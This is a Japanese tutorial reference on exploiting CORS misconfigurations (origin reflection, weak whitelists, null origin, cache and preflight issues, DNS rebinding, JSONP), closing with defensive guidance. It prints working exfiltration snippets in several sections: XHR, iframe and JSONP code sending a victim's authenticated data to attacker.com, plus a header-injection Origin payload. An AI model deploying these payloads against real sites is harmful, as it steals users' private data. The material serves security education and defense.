## CORS武器化の網羅リファレンス

CORS（Cross-Origin Resource Sharing、クロスオリジンリソース共有）は、ブラウザの同一生成元ポリシー（Same-Origin Policy、SOP。プロトコル・ドメイン・ポートの3要素が一致するオリジンのみリソースへのアクセスを許可する仕組み）を、サーバー側の明示的な許可によって緩和する仕組みである。しかし実装ミスがあると、この「緩和の仕組み」自体が攻撃者にとっての武器になる。本節では、CORS設定不備を実際にエクスプロイトするための具体的な手口を、原理レベルまで掘り下げて網羅的に整理する。

### 前提知識の再確認

CORSは主に2つのヘッダーで制御される。

- `Access-Control-Allow-Origin`（以下 ACAO）: どのオリジンからのクロスオリジンリクエストのレスポンスをJavaScriptが読み取ってよいかを指定する。
- `Access-Control-Allow-Credentials`（以下 ACAC）: `true`の場合、Cookieや`Authorization`ヘッダーなどの認証情報を含んだリクエストが許可され、レスポンスの読み取りも許可される。

仕様上、ACAOには単一のオリジン文字列・`null`・ワイルドカード`*`のいずれかしか指定できない（複数オリジンをスペース区切りやカンマ区切りで並べる書き方はどのブラウザもサポートしない）。また`*`はACACが`true`の場合には併用できない仕様になっている。この制約があるため、「任意のオリジンからの資格情報付きアクセスを許可したい」という要件を実装しようとした開発者は、静的な`*`ではなく、リクエストの`Origin`ヘッダーを読み取ってそのままACAOに反映する、あるいは自前のホワイトリスト判定ロジックを書く、という実装に流れやすい。CORS武器化のほぼすべての手口は、この「動的生成」または「独自検証ロジック」の欠陥を突くものである。

エクスプロイトが成立するための基本条件は次の3つに整理できる。

1. 攻撃者が用意した任意のOriginを、サーバーがACAOとして反映する、または`null`を許可する
2. `Access-Control-Allow-Credentials: true`が返る（＝Cookieなどの認証情報を使ったリクエストが成立する）
3. 攻撃者が被害者のブラウザ上でリクエストを発火させ、レスポンスを窃取できる（XHR/fetchの`withCredentials`/`credentials: include`）

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

以降、この3条件を崩すための個別の設定不備パターンを見ていく。

### 1. Originヘッダーの単純反映（Origin Reflection）

もっとも単純かつ依然として非常に多い不備は、サーバーがリクエストの`Origin`ヘッダーの値をそのままACAOに書き戻すという実装である。

```http
GET /api/account HTTP/1.1
Host: victim.example.com
Origin: https://attacker.com
Cookie: session=abcdef...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

攻撃者はどんなオリジンからでも許可されると分かった時点で、被害ページを訪れさせるだけで攻撃が完成する。実際に窃取するJavaScriptは次のようになる。

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'https://victim.example.com/api/account', true);
req.withCredentials = true;
req.onload = function () {
    // レスポンス本文（被害者のセッションに紐づくデータ）を攻撃者サーバーへ送信
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(this.responseText));
};
req.send();
```

**なぜ成立するのか**: ブラウザはCORSの許可判定を「サーバーが返したヘッダー」だけを見て行う。攻撃者はどんなOriginでも自由に名乗れる（Originヘッダーはブラウザが自動付与するが、その値は攻撃者が用意したページのオリジンそのものであり、攻撃者が完全にコントロールできる）。サーバー側が「送られてきたOriginをそのまま信頼して返す」という設計にした瞬間、事実上「全世界のオリジンを許可している」のと同義になる。`withCredentials = true`（fetchでは`credentials: 'include'`）を指定すると、ブラウザは対象オリジンのCookieを自動的に乗せてリクエストを送る。レスポンスのACAOが攻撃者オリジンと一致し、かつACACが`true`であれば、ブラウザはJavaScriptにレスポンス本文の読み取りを許可する。これがCSRFと異なる点で、CSRFは「リクエストの発火」はできてもレスポンスは読めないのに対し、CORS武器化は認証済みのGETリクエストのレスポンス（個人情報、APIキー、CSRFトークンなど）を丸ごと盗み出せる点で被害が大きい。

### 2. ワイルドカードサブドメインの検証不備（サフィックス/プレフィックス/部分一致チェック）

「ホワイトリスト方式にしているから安全」という思い込みが生む不備群である。典型的な実装ミスは次のようなものだ。

```javascript
// 不備のある実装例(概念コード)
if (origin.endsWith("victim.com")) {
    res.setHeader("Access-Control-Allow-Origin", origin);
}
```

`endsWith`によるサフィックス一致は、攻撃者が`https://evilvictim.com`や`https://notvictim.com`のようなドメインを取得すれば容易に突破できる。逆に`startsWith`や`indexOf`による部分一致では、`https://victim.com.attacker.com`のようにサブドメインとして`victim.com`を含む攻撃者所有ドメインが許可されてしまう。ドメインの構造は左から右に「サブドメイン.セカンドレベル.TLD」であり、ブラウザやDNSにとって権威を持つのは常に右端（TLD側）である。`victim.com.attacker.com`の実体は`attacker.com`のサブドメインであり、`victim.com`とは無関係のドメインだが、文字列としては`victim.com`を含んでいるため、雑な文字列一致チェックはこれを見逃す。

### 3. 正規表現の実装ミス — ドットのエスケープ漏れ

ホワイトリスト判定を正規表現で書く実装も多いが、ここにも典型的な落とし穴がある。

```javascript
// 危険な正規表現の例
var re = /^https?:\/\/.*\.victim\.com$/;
```

一見「`victim.com`のサブドメインだけを許可する」意図に見えるが、正規表現の`.`はエスケープしなければ「任意の1文字」を意味する。つまり`\.victim\.com`のドットが正しくエスケープされていない、たとえば`.*.victim.com$`のように書かれていた場合、`.`が「任意の1文字」として評価され、`Xvictim.com`（`.`の位置に別の文字が来ても良い）のような文字列や、`attackerXvictimXcom`のような紛らわしいドメインまで許可してしまう可能性がある。

さらに、`$`による終端固定を忘れた正規表現（`^https://.*\.victim\.com`のように末尾の`$`がない）は、`https://victim.com.attacker.com`のように、正規表現が要求する部分文字列がURLの先頭～中間にあれば良いだけの判定になり、任意のサフィックスを後ろに付け足すだけで通過してしまう。

**原理**: 正規表現マッチングは「パターンに一致する部分文字列が存在するか」を判定するのが基本動作であり、明示的に`^`（先頭固定）と`$`（末尾固定）でアンカーしない限り、文字列全体の一致は保証されない。ホワイトリスト検証のような「全体が特定の形式であること」を保証したい場面では、アンカーの有無、そして`.`や`-`など正規表現上のメタ文字が意図せず「任意文字」として解釈されていないかを必ず確認する必要がある。

### 4. ブラウザ間の解釈差を突く特殊文字バイパス

HackTricksが詳述する高度な手口として、正規表現やホワイトリストが「英数字と`.`・`-`だけを想定している」場合に、ブラウザごとのホスト名解釈の違いを突く方法がある。

- Safariは特定の版で`{`のような通常ドメインには使われない文字を含むオリジンでも独自の解釈をすることがあり、`victimdomain.com{.attacker.com`のような文字列が細工に使われた例がある。
- Chrome/Firefox系では、アンダースコア`_`を含むサブドメインラベル（`victim_domain.attacker.com`など）が、正規表現側では「アンダースコアはドメインとして無効」という前提で緩く扱われている一方、ブラウザの実際のDNS解決では有効なホスト名として扱われてしまうケースがあり、検証ロジックとブラウザの実装の間に認識のズレが生まれる。

**原理**: これらの手口は「サーバー側の検証ロジックが想定しているホスト名の文法」と「ブラウザが実際にURLとして解釈・DNS解決する文法」との間にギャップがあることを利用している。RFC上のホスト名規則と、各ブラウザのURLパーサ（Chromium・WebKit・Geckoでそれぞれ実装が異なる）の寛容さには差があり、検証を書いた開発者が想定していない文字がブラウザには通ってしまう、という「パーサ差分攻撃」の一種である。CORS検証に限らず、URL/ホスト名を扱うセキュリティチェック全般に共通する脆弱パターンである。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 5. null オリジンの悪用

`Origin: null`は、ローカルファイルからの`file://`アクセス、`sandbox`属性付き（`allow-same-origin`を指定しない）iframe、`data:`スキームのページ、一部のリダイレクトなど、いくつかの正当な状況でブラウザが自動的に送信するオリジンである。開発者が「ローカル環境でのテストのため」といった理由で`null`をホワイトリストに加えてしまっているケースが典型的な不備である。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.open('GET', 'https://victim-site.com/accountDetails', true);
  req.withCredentials = true;
  req.onload = function () {
    location = 'https://attacker.com/log?key=' + this.responseText;
  };
  req.send();
</script>"></iframe>
```

**なぜ成立するのか**: `sandbox`属性を持つiframeは、`allow-same-origin`を明示的に付与しない限り、iframe内のコンテンツは常に「一意の（unique）オリジン」として扱われ、そのシリアライズ表現がブラウザ間で共通して`null`になる。攻撃者は自分のドメイン上にこの構造を置くだけで、任意のタイミングで`null`オリジンを生成できる。サーバーが`null`を「安全な特別扱い」として許可すると、実際には「誰でも作れるオリジン」を許可していることになり、Origin反映と同じ結末に至る。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 6. 資格情報なしワイルドカード（`*`）の実害

`Access-Control-Allow-Origin: *`はACACが`true`の場合には仕様上使えないため、単体では「認証情報を伴わないリクエストへの応答」に限られる。一見無害に思えるが、次のようなケースで実害が発生する。

- 認証をCookieやセッションではなく、URLパラメータやローカルストレージのトークンで行っているAPIでは、`*`が付いていても実質的に誰でも認証済み相当のデータへアクセスできてしまう。
- イントラネット向けのAPIサーバーが誤って`*`を返す設定でインターネットに露出している場合、外部の悪意あるWebページを踏んだ内部ネットワークの利用者のブラウザを踏み台にして、内部専用APIへの「事実上のプロキシ」として悪用される（SSRF的なピボット）。攻撃者は自分のWebサイトに被害者を誘導するだけで、被害者のブラウザ経由でイントラネット内のAPIにfetchを送らせ、そのレスポンスを外部へ持ち出せる。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 7. 信頼オリジン上のXSSとの合わせ技

ホワイトリストの実装自体は堅牢（完全一致のみ許可、正規表現の不備もない）であっても、そのホワイトリストに含まれるオリジンのいずれかにXSS脆弱性が存在すれば、CORSの防御は無意味になる。攻撃者はそのXSSを踏み台にして、信頼された（＝CORSで許可された）オリジンから被害対象サーバーへ、資格情報付きのリクエストを発火させることができる。

**原理**: CORSのホワイトリストは「そのオリジンのコード全体を信頼する」という設計であり、そのオリジン内のどこか一箇所でも任意コード実行（XSS）が可能になれば、信頼の単位であるオリジン全体が攻撃者にとって「合法的な踏み台」になる。これはCORSに限らずオリジンベースの信頼モデル全般に共通する弱点であり、「許可リストに入れるオリジンの数を最小限にする」ことがそのまま攻撃対象領域の縮小に直結する理由でもある。

### 8. サーバーサイド・キャッシュ汚染との組み合わせ（レガシーだが概念として重要）

HackTricksが紹介する古典的手口として、Internet ExplorerやEdgeの一部バージョンにおいて、HTTPヘッダー中の復帰文字（CR、`0x0d`）がヘッダーの終端として誤解釈される実装バグを突き、`Origin`ヘッダーにヘッダーインジェクションを試みる手口がある。

```
Origin: z\r\nContent-Type: text/html; charset=UTF-7
```

これが刺さる環境では、サーバーが生成するキャッシュ済みレスポンスの文字エンコーディングをUTF-7に切り替えさせられ、UTF-7特有の`+ACI-`のようなエンコード列を使ったXSSペイロードをレスポンスに混入させられる可能性がある。

**なぜここに書くのか（時事性の注記）**: この手法はIE/Edge（EdgeHTMLベースの旧版）固有のヘッダーパーサの挙動とUTF-7自動判定という、現在の主要ブラウザ（Chromium系・Firefox・Safari、および2020年に開発終了したレガシーEdgeを除く）では既に成立しない古い実装依存のテクニックである。現代の実務では再現性がほぼないが、「CORSの検証不備」と「隣接するレイヤ（文字エンコーディング処理やキャッシュ機構）の実装バグ」を組み合わせると被害が増幅するという設計原理は今も通用するため、概念として押さえておく価値がある。

### 9. クライアントサイド・キャッシュ悪用（`Vary: Origin`の欠落）

CORS対応レスポンスをオリジンごとに出し分けているサーバーが、`Vary: Origin`ヘッダーを付与し忘れているケースがある。

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Cache-Control: public, max-age=3600
Content-Type: text/html
```

**原理**: HTTPキャッシュ（ブラウザキャッシュや共有プロキシ・CDNキャッシュ）は、原則としてURLをキーにレスポンスを保存する。しかしCORS対応サーバーはリクエストの`Origin`ヘッダーによって返すACAOの値を変えている（＝同じURLでもリクエストごとにレスポンス本体やヘッダーが変わりうる）。この「キャッシュキーに含まれない要素によってレスポンスが変わる」状態を、キャッシュ機構に明示的に伝えるのが`Vary`ヘッダーの役割である。`Vary: Origin`が欠落していると、キャッシュは「同じURLなら常に同じレスポンスを返してよい」と誤認し、攻撃者オリジンから送ったリクエストによってキャッシュされたレスポンス（攻撃者向けにACAOが設定された、あるいは攻撃者が仕込んだ細工入りの）が、後から別のオリジンやユーザーに対しても配信されてしまう可能性がある。さらに、攻撃者がカスタムヘッダー経由でXSSペイロードを注入し、それがキャッシュに乗ってしまえば、被害者が該当URLへ通常アクセスした際にそのペイロードが実行される、という被害拡大の経路も生まれる。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 10. Preflightリクエストの理解とその迂回

「単純リクエスト」（GET/POST/HEADのいずれかで、`Content-Type`が`application/x-www-form-urlencoded`・`multipart/form-data`・`text/plain`のいずれかであり、カスタムヘッダーを付けないもの）はpreflightなしで直接送信される。それ以外のメソッド（PUT・DELETEなど）やカスタムヘッダー、`application/json`などのContent-Typeを使う場合は、実リクエストの前にブラウザが自動的にOPTIONSメソッドのpreflightリクエストを送る。

```http
OPTIONS /data HTTP/1.1
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

サーバーがこのpreflightに対して許可（`Access-Control-Allow-Methods`・`Access-Control-Allow-Headers`を含む200番台応答）を返さない限り、ブラウザは実リクエストを送信しない。

**攻撃者にとっての意味**: 逆に言えば、攻撃者は「単純リクエストの形式に収まるリクエスト」であればpreflightという関門そのものを回避できる。たとえばJSONを送るAPIであっても`Content-Type: text/plain`で送信し、サーバー側がContent-Typeを厳密に検証せず本文をJSONとしてパースしてしまう実装であれば、preflightなしで状態変更リクエストを送れてしまう。これはCSRF対策としてCORSやpreflightに過度に依存することの危険性を示す典型例であり、「preflightが通らないから安全」という思い込みが誤りであることの根拠になる。防御側は、状態変更を伴うエンドポイントでは必ずCSRFトークンなど独立した対策を併用すべきである。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 11. DNSリバインディングによるSOP迂回（応用・関連手口）

CORS設定自体の不備ではないが、CORS/SOPの境界そのものを崩す関連手口としてDNSリバインディングがある。

- **TTL経由の攻撃**: 攻撃者はまず短いTTL（DNSレコードの有効期間）を設定した自分のドメインへ被害者を誘導し、JavaScriptを実行させる。初回アクセス時は攻撃者のサーバーIPを返すが、TTL経過後に再度名前解決させ、今度は被害者が本来アクセスできない内部IP（例: イントラネット内のサーバー）を返すよう切り替える。ブラウザは「オリジンが変わっていない」と認識したまま、実際の接続先だけが内部サーバーへ切り替わるため、SOPの制約を保ったまま内部ネットワークへの到達性を得られる。ブラウザのDNSキャッシュの保持期間はTTLの指定値と厳密には一致せず、環境によって数秒から数分保持されることがある点も攻撃の再現性に影響する。
- **複数Aレコードによるフェイルオーバー悪用**: 同一ホスト名に対して攻撃者IPと被害者側のローカルIP（`127.0.0.1`など）を両方登録しておき、初回は攻撃者IPで応答してペイロードを配信、その後意図的にタイムアウトさせることで、ブラウザ側のフェイルオーバー機構により2番目のIP（内部向け）へ接続を切り替えさせる手口も報告されている。

**原理**: DNSリバインディングはSOPが「オリジン文字列（スキーム・ホスト名・ポート）」だけを同一性の基準にしており、「そのホスト名が実際にどのIPを指すか」を継続的に再検証しない、という設計上の前提を突く。CORSの検証不備と組み合わさると、内部サーバーがOriginヘッダーだけで信頼判定をしている場合に、外部からのリバインディング経由のリクエストが「社内オリジンからの正規リクエスト」であるかのように受理されてしまう危険がある。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 12. JSONP/XSSIによるCORS非依存の情報窃取

`<script>`タグによるリソース読み込みはSOPの制約を受けない（クロスオリジンのスクリプトを読み込むこと自体はブラウザの基本機能として許可されている）。この性質を利用し、APIがJSONPコールバック（`?callback=`パラメータで指定した関数名でレスポンスをラップする形式）に対応している場合、CORSヘッダーが一切なくても資格情報付きのデータを窃取できる。

```html
<script src="https://victim.com/api/userinfo?callback=stealData"></script>
<script>
function stealData(json) {
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(json)));
}
</script>
```

**原理**: `<script src="...">`はCookieを含むリクエストとしてクロスオリジンで自動的に送信され、ブラウザはそのレスポンスをそのままJavaScriptとして実行する。レスポンスがJSONPの形式（関数呼び出しでデータをラップしたもの）であれば、攻撃者が定義した同名の関数にデータがそのまま引数として渡り、CORSヘッダーの有無に関わらず窃取が成立する。これはCORS武器化そのものではないが、「CORSさえ塞げば安全」という誤解を正すために不可欠な隣接知識であり、JSONPエンドポイントの廃止、または`Referer`/カスタムヘッダーチェックの併用が対策となる。

### 13. その他の関連ホワイトリスト不備

- **内部IPの許可**: `0.0.0.0`（Linux/macOSでは多くの場合ローカルホスト相当として解釈される）や`localhost`へのCNAMEリダイレクトを許可してしまう実装。
- **内部CNAMEの許可**: `internal-service.corp.example`のような社内向けホスト名をそのまま許可リストに含めてしまい、DNS的に権威を持たない攻撃者がその名前を騙れる環境（社内DNSの汚染やVPN越しのテスト環境など）で悪用される。
- **`postMessage`との連携チェック漏れ**: `event.origin === window.location.origin`のような比較だけを行い、iframeやポップアップ経由で受け取ったメッセージの送信元を十分に検証しない実装は、CORSとは別レイヤの話だが同じ「オリジン検証の甘さ」という根に属する不備であり、あわせて監査すべき対象である。

> 出典: HackTricks: CORS Misconfigurations & Bypass — https://book.hacktricks.xyz/pentesting-web/cors-bypass

### 14. PayloadsAllTheThings に見る攻撃条件の整理とツール

PayloadsAllTheThingsのCORS Misconfigurationセクションでは、上記の攻撃が成立するための必要条件を次の3点に集約して整理している。

- 攻撃者が用意した任意の`Origin`ヘッダー
- 被害サーバーの`Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin`が攻撃者オリジンを反映する、または`null`を許可している

さらに、実務での検出・検証を助けるツールとして以下が挙げられている。

- **Corsy**: CORS設定の自動スキャナ。ホワイトリスト判定ロジックの弱点（Origin反映、サブドメインワイルドカードの誤設定、nullの許可など）を検出する。
- **CORScanner**: 大量のホストに対してCORS設定不備をバルクスキャンするツール。
- **PostMessage POC Builder**: `postMessage`関連の検証不備を検証するためのPoC生成支援ツール。
- **of-cors**: CORS設定不備の実証コードを生成するツール。
- **CorsOne**: 複数のCORSバイパスパターンを一括で試行するツール。

これらのツールは「防御側が自組織のAPIに対して設定不備がないかを確認する」目的で用いるべきであり、許可を得ていない第三者のサービスに対して実行してはならない。

> 出典: PayloadsAllTheThings: CORS Misconfiguration — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration

### 15. VeryLazyTechが強調する実務的な視点

VeryLazyTechの解説では、CORS武器化を実務上のバグバウンティ／ペネトレーションテストの視点から整理しており、次の点が強調されている。

- CORS設定不備は単独の脆弱性というより「他の脆弱性の被害を増幅する乗数」として働くことが多い。たとえば認証済みユーザー向けAPIのレスポンスに個人情報やAPIキー、CSRFトークンが含まれる場合、CORS不備はそれらを丸ごと外部へ持ち出す経路になる。
- CORS不備は、CSRF対策がOriginヘッダーの検証のみに依存している実装に対しては、CSRF対策そのものの迂回にもつながりうる。攻撃者が許可されたオリジンからのリクエストとして正規に認識される経路を確保できれば、CSRFトークンなしで状態変更が可能になるケースがある。
- ドメイン許可リストのバイパスとして、プレフィックス/サフィックス/部分文字列の緩い一致に加え、「相対URLに見せかけた絶対URL」をブラウザが許可されたホストとして誤認するケースや、ループバックアドレスの別表記（IPv4の10進表記以外の表現、IPv6射影アドレスなど）を用いた正規化バイパスが紹介されている。これらはいずれも「文字列としての比較」と「ブラウザ・OSが実際に解決する対象」との間のズレを突くという、本節を通じて繰り返し登場する原理の具体例である。
- `Access-Control-Allow-Headers: *`のようにリクエストヘッダーまで無制限に許可している場合、攻撃者は任意のカスタムヘッダーを使ったAPI呼び出しを組み立てられるようになり、ユーザー名・メールアドレス・セッショントークン・プライベートAPIキーといった機微情報の抽出に直結しうる。
- Preflightの仕組みを悪用し、本来ブロックされるべきPOST/PUT/DELETEといった状態変更系のリクエストを、設定不備によって成立させてしまうと、アカウント乗っ取りやデータ改ざん・削除にまで発展する。

> 出典: VeryLazyTech: CORS Misconfigurations & Bypass — https://www.verylazytech.com/cors-misconfigurations-and-bypass

### 防御側の実装指針（まとめ）

本節で扱った攻撃手口はいずれも防御目的の理解のために整理したものであり、実際の検証は自組織が保有・許可を得たシステムに対してのみ行うべきである。設計・実装レベルでの対策を以下にまとめる。

1. **ACAOは固定の完全一致リストで判定する**。正規表現を使う場合は必ず`^`と`$`でアンカーし、`.`は`\.`としてエスケープする。可能であれば正規表現よりも、事前に正規化したドメイン文字列の完全一致比較（`Set`や配列に対する`===`比較）を用いる。
2. **`null`オリジンを許可リストに含めない**。ローカル開発用の特例は、環境変数などで本番ビルドから明確に分離する。
3. **`Access-Control-Allow-Credentials: true`を返すエンドポイントでは、ACAOに`*`を使わない**（仕様上も不可だが、動的生成コードでは`*`とOrigin反映を誤って両立させるバグが起こりうるため明示的に確認する）。
4. **資格情報が必要なAPIほど許可オリジンの数を最小限にする**。許可リストに載せるオリジンについては、XSS対策も含めて信頼性を継続的に監査する。
5. **`Vary: Origin`を必ず付与する**。オリジンに応じてレスポンスヘッダーや内容を変えるすべてのエンドポイントで、キャッシュ機構に対してその旨を明示する。
6. **CSRF対策をOriginヘッダー検証だけに依存させない**。CSRFトークンやSameSite Cookie属性など、CORSとは独立したレイヤの対策を併用する。
7. **Preflightの通過をセキュリティ境界として過信しない**。単純リクエストの範囲に収まるリクエストで状態変更が可能な設計になっていないか確認する。
8. **社内向けAPIをインターネットに露出させる際は、CORS設定だけでなくネットワークレベルの到達性制御（VPN、IP制限、mTLS等）も併用する**。CORSはあくまでブラウザという実行環境の中での制御であり、ネットワーク層の防御を代替しない。
